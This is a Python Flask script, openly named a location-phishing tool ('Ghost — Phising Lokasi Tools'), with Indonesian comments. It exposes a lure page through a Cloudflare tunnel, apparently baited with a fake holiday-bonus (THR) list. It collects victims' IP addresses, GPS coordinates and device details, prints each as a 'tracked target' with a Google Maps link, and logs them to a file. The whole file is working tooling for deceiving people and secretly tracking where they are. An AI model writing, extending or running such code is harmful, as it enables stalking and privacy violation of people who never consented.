import os, sys, time, subprocess, re, json
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)
RED, GREEN, YELLOW, CYAN, BOLD, RESET = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Style.BRIGHT, Style.RESET_ALL

app = Flask(__name__)
CORS(app)
current_tunnel_url = ""

import os

# Definisi Warna (Wajib ada di awal script)
RED = '\033[91m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
BOLD = '\033[1m'
RESET = '\033[0m'

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Inisial ASCII PLT (Kuning/Cyan, Gaya Gambar 2)
    print(f"{RED}{BOLD}   ██████╗ ██╗     ████████╗  ")
    print(f"{RED}{BOLD}   ██╔══██╗██║     ╚══██╔══╝  ")
    print(f"{RED}{BOLD}   ██████╔╝██║        ██║     ")
    print(f"{RED}{BOLD}   ██╔═══╝ ██║        ██║     ")
    print(f"{RED}{BOLD}   ██║     ███████╗   ██║     ")
    print(f"{RED}{BOLD}   ╚═╝     ╚══════╝   ╚═╝     ")
    
    # Judul & Menu (Gaya Gambar 2)
    print(f"{WHITE}{BOLD}   [ Ghost — Phising Lokasi Tools ]")
    print(f"{RED}   " + "—" * 45)
    
    # Menu Utama bergaya Banser CAW (Sesuai Gambar 1/2)
    print(f"{WHITE}{BOLD}   —— MENU UTAMA PLT-TOOLS ———")
    print(f"{WHITE}   1. Jalankan Monitoring Jaringan")
    print(f"{RED}   2. Eksekusi Pancingan (Lacak Lokasi)")
    print(f"{WHITE}   3. Keluar Program")
    print(f"{RED}   " + "—" * 45)
    
    print(f"{YELLOW}   Pilih Opsi (1/2/3): {RESET}", end="")

# Jalankan fungsi banner
banner()
def start_tunnel():
    print(f"{YELLOW}[*] Menghubungkan ke Cloudflare Tunnel...{RESET}")
    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'], 
                            stderr=subprocess.PIPE, text=True)
    link = None
    for _ in range(40):
        line = proc.stderr.readline()
        if "trycloudflare.com" in line:
            match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
            if match:
                link = match.group(0)
                break
        time.sleep(0.5)
    return link, proc

@app.route('/')
def home():
    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    return render_template_string(html_content, link_cloudflared=current_tunnel_url)

@app.route('/api/save-location', methods=['POST'])
def save_location():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ts = datetime.now().strftime('%H:%M:%S')
    lat = data.get('lat')
    lon = data.get('lon')
    acc = data.get('acc')

    # TAMPILAN TERMINAL SEPERTI SEBELUMNYA (DIBUAT SANGAT DETAIL)
    print(f"\n{GREEN}[+] TARGET TERLACAK! ({ts}){RESET}")
    print(f"{RED}="*45)
    print(f"{RED}IP Target   : {RESET}{ip}")
    print(f"{RED}Koordinat   : {GREEN}{lat}, {lon}{RESET}")
    print(f"{RED}Akurasi     : {RESET}{acc}")
    print(f"{RED}Google Maps : {CYAN}https://www.google.com/maps?q={lat},{lon}{RESET}")
    print(f"{RED}-"*45)
    print(f"{YELLOW}[ INFO PERANGKAT ]{RESET}")
    print(f"{RED}OS/Platform : {RESET}{data.get('platform')}")
    print(f"{RED}RAM (Est.)  : {RESET}{data.get('ram')} GB")
    print(f"{RED}Baterai     : {RESET}{data.get('battery')}")
    print(f"{RED}="*45)

    # Simpan ke Log File
    with open("ghost_thr_logs.txt", "a") as f:
        f.write(f"[{ts}] IP:{ip} | Loc:{lat},{lon} | Acc:{acc} | Dev:{data.get('platform')}\n")
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    banner()
    link, cf_proc = start_tunnel()
    if link:
        current_tunnel_url = link
        print(f"{GREEN}[!] SERVER LIVE: {BOLD}{link}{RESET}")
        print(f"{YELLOW}[*] Menunggu target mengunduh daftar THR... (Ctrl+C untuk stop){RESET}\n")
        try:
            app.run(host='0.0.0.0', port=5000)
        except KeyboardInterrupt:
            cf_proc.terminate()
            print(f"\n{RED}[!] Server dihentikan.{RESET}")
    else:
        print(f"{RED}[!] Gagal membuat tunnel. Pastikan cloudflared terinstal dan aktif.{RESET}")